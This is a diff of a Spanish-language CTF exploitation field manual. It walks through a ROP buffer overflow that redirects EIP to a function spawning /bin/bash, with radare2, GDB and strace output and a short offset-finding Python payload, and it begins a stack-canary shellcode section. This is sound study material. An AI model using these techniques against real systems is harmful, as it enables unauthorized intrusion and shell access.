@@ -32,7 +32,7 @@
 <p>Redactado por Alvaro M. aka <code><a href="https://twitter.com/naivenom">@naivenom</a></code>.</p>
 <h2 id="indice">Indice</h2>
 <h4 id="indice-exploiting">[Exploiting]</h4>
-<p><a href="#refs_uno">1. ROP,NX habilitado, buffer y función read(). ASLR no aleatoriza las direcciones</a></p>
+<p><a href="#refs_uno">1. ROP,NX habilitado, usando buffer para sobreescritura de EIP y función read(). ASLR no aleatoriza las direcciones</a></p>
 <p><a href="#refs_dos">2. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></p>
 <h2 id="introduccion">Introducción</h2>
 <p>Recomiendo que se tome este manual como una referencia de los binarios que he ido realizando a lo largo del 2018 y posterior. 
@@ -40,9 +40,13 @@ Realmente cada técnica esta dividida en <em>seis</em> apartados con lo mas resa
 En la sección de comandos sólo me limito a poner el output del comando mas destacable, recomiendo que descarguen el binario y vean todo el contenido si lo requieren. Es un Field Manual y debe ser versátil para cuando se encuentren un problema de las mismas características sepan resolverlo o le ayuden.</p>
 <p>Esta página web será un documento vivo ya que estará en actualización diaria debido a mi estudio constante.</p>
 <h2><a id="refs_uno" href="#refs_uno">1. ROP,NX habilitado, buffer y función read(). ASLR no aleatoriza las direcciones</a></h2>
+<h4>[Resumen]:</h4>
+Tenemos que explotar un ROP usando un buffer para la sobreescritura de EIP protegido con NX habilitado.
+<h4>[Tecnica]:</h4>
+ROP usando un buffer para la sobreescritura de EIP protegido con NX habilitado apuntando a la función <code>not_called()</code> y ejecutar un <code>/bin/bash</code>.
 <h4>[Informe]:</h4>
 <p><em><strong>Recolección de información</strong></em></p>
-Primero debemos obtener la información necesaria para realizar la explotación del binario. Sabiendo que tiene una función <code>read()</code> que va a leer nuestro input que introduzcamos un tamaño de <code>256</code> bytes y también tenemos un buffer <code>ebp-0x88</code> que es donde se almacenará el input. Si desensamblamos la función <code>vulnerable_function()</code> usando radare2 vemos el tamaño que lee siendo uno de sus argumentos. Esto quiere decir que va a leer más que lo que guarda nuestro buffer.
+Primero debemos obtener la información necesaria para realizar la explotación del binario. La principal diferencia entre los buffer overflow y ROP es que este último tienen habilitado NX / ASLR y, a veces, otras protecciones. Esto significa que las direcciones libc y stack son aleatorias, y que ninguna memoria es simultáneamente grabable y ejecutable. Sabiendo que tiene una función <code>read()</code> que va a leer nuestro input que introduzcamos un tamaño de <code>256</code> bytes y también tenemos un buffer <code>ebp-0x88</code> que es donde se almacenará el input. Si desensamblamos la función <code>vulnerable_function()</code> usando radare2 vemos el tamaño que lee siendo uno de sus argumentos. Esto quiere decir que va a leer más que lo que guarda nuestro buffer.
 <pre><code>[0xf7fc0c70]> s sym.vulnerable_function
 [0x080484b8]> pdf
 / (fcn) sym.vulnerable_function 41
@@ -63,7 +67,17 @@ Primero debemos obtener la información necesaria para realizar la explotación 
 \           0x080484e0      c3             ret
 </code></pre>
 La función que debemos ganar acceso para obtener nuestra shell es <code>not_called()</code> debido a que dentro de la función llama a <code>system("/bin/bash")</code>, por lo tanto es fácil ya que no necesitamos una shellcode.
-Usaremos GDB para testear el buffer overflow y ver cuando sobreescribe <code>$eip</code>. Si enviamos un número determinado de "junk" al buffer realizamos la sobreescritura!(ver:exploit).
+<p><em><strong>Explotación</strong></em></p>
+Usaremos GDB para testear el buffer overflow y ver cuando sobreescribe <code>$eip</code>. Si enviamos un número determinado de "junk" al buffer realizamos la sobreescritura!(ver:exploit). Podemos rastrear la sobreescritura usando <code>strace</code>: 
+<pre><code>naivenom@parrot:[~/pwn/rop1_] $ python rop_exploit.py | strace ./rop
+read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 144
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x44444444} ---
++++ killed by SIGSEGV +++
+Violación de segmento
+</code></pre>
+Por último ya sabiendo que tenemos controlado <code>$eip</code> lo único que necesitamos es usar la dirección de la función <code>not_called()</code> para que apunte allí y nos ejecute una shell.
+<p><em><strong>Obteniendo root shell</strong></em></p>
+Pudimos debuggear y analizar el binario en nuestra maquina, pero ahora toca la fase en la que ganamos acceso. El binario vulnerable esta ejecutandose en el servidor victima en el puerto 1234.
 <h4>[Comandos]:</h4>
 Primero antes de nada comprobamos la seguridad del binario y observamos que <code>NX</code> esta habilitado.
 <pre><code>❯ gdb -q rop
@@ -87,7 +101,7 @@ Stopped reason: SIGSEGV
 0x44444444 in ?? ()
 </code></pre>
 <h4>[Exploit Development]:</h4>
-Enviamos al binario cuando lo debugeamos con GDB la salida de este script usando <code>r < salida</code>
+Enviamos al binario cuando lo debugeamos con GDB la salida de este script <code>rop_exploit.py</code>usando <code>r < salida</code>
 <div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">import</span> sys
 
 sys.stdout.write(<span style="color: #0000FF">&quot;A&quot;</span>*<span style="color: #0000FF">140</span>+<span style="color: #0000FF">&quot;DDDD&quot;</span>)
@@ -96,6 +110,10 @@ sys.stdout.write(<span style="color: #0000FF">&quot;A&quot;</span>*<span style="
 
 <h4>[URL Reto]:</h4>
 <h2><a id="refs_dos" href="#refs_dos">2. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></h2>
+<h4>[Resumen]:</h4>
+Tenemos que explotar un Buffer Overflow protegido con un stack canary float value.
+<h4>[Tecnica]:</h4>
+Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary).
 <h4>[Informe]:</h4>
 <p><em><strong>Recolección de información</strong></em></p>
 
